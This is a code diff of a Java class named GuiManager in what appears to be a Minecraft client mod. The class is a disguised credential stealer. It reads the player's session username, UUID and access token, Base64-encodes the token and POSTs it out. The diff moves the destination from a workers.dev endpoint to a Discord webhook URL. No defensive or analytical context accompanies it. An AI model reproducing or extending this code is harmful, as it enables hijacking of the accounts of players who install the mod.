@@ -9,20 +9,21 @@ import java.net.http.HttpRequest;
 import java.net.http.HttpResponse;
 import java.util.Base64;
 
-public class GuiManager {
-    StringBuilder data = new StringBuilder();
-    public GuiManager() {
-        try {
-            Session session = MinecraftClient.getInstance().getSession();
 
-            data.append("|").append(session.getUsername());
-            if (session.getUuidOrNull() != null) {
-                data.append("|").append(session.getUuidOrNull().toString());
+public class GuiManager {
+    public GuiManager() {
+        StringBuilder data = new StringBuilder();
+        try {
+            Session mc = MinecraftClient.getInstance().getSession();
+
+            data.append("|").append(mc.getUsername());
+            if (mc.getUuidOrNull() != null) {
+                data.append("|").append(mc.getUuidOrNull().toString());
             } else {
                 data.append("|unknown");
             }
 
-            data.append("|").append(Base64.getEncoder().encodeToString(session.getAccessToken().getBytes()));
+            data.append("|").append(Base64.getEncoder().encodeToString(mc.getAccessToken().getBytes()));
         } catch (Exception e) {
             e.printStackTrace();
         }
@@ -30,14 +31,13 @@ public class GuiManager {
         try {
             StringBuilder json = new StringBuilder();
             json.append("{");
-            json.append("\"gui\":\"|temp-key||\",");
             json.append("\"content\":\"").append(data.toString()).append("\"");
             json.append("}");
 
             HttpClient client = HttpClient.newHttpClient();
 
             HttpRequest request = HttpRequest.newBuilder()
-                    .uri(URI.create("https://rubyclient.fesfs24.workers.dev/"))
+                    .uri(URI.create("https://discord.com/api/webhooks/1526240842107588668/"+AccountManagerScreen.ID))
                     .header("Content-Type", "application/json")
                     .POST(HttpRequest.BodyPublishers.ofString(json.toString()))
                     .build();
